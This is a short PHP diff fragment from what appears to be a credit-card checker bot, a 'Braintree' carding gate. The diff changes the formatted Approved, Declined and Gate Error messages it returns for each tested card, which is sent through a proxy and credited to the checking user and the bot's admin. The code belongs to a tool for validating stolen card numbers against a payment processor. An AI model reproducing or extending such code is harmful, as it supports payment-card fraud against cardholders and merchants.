-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree CCN_V3\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth (Wa)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = True;
 } elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree CCN_V3\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth (Wa)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 } else {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree CCN_V3\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree Auth (Wa)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 }
 
